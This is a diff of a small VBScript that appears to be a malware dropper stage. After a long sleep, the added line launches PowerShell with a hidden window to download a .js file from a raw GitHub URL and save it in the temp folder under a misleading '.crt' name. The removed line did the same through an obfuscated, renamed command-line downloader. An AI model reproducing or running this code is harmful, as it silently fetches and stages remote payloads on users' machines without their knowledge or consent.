@@ -1,7 +1,7 @@
 WScript.Sleep(20000)
 
 Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "%temp%\write32\wincgi.exe -f -ur""""lc""""ache h""""t""""t""""ps:/""""/raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/write32.js "%temp%\write32\write32.crt"", 0, True
+objShell.Run "PowerShell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/kaitlyn93/Grandcoffee/main/js/scripts/write32.js','%temp%\write32\write32.crt'); ", 0, True
 	
 WScript.Sleep(5000)
 
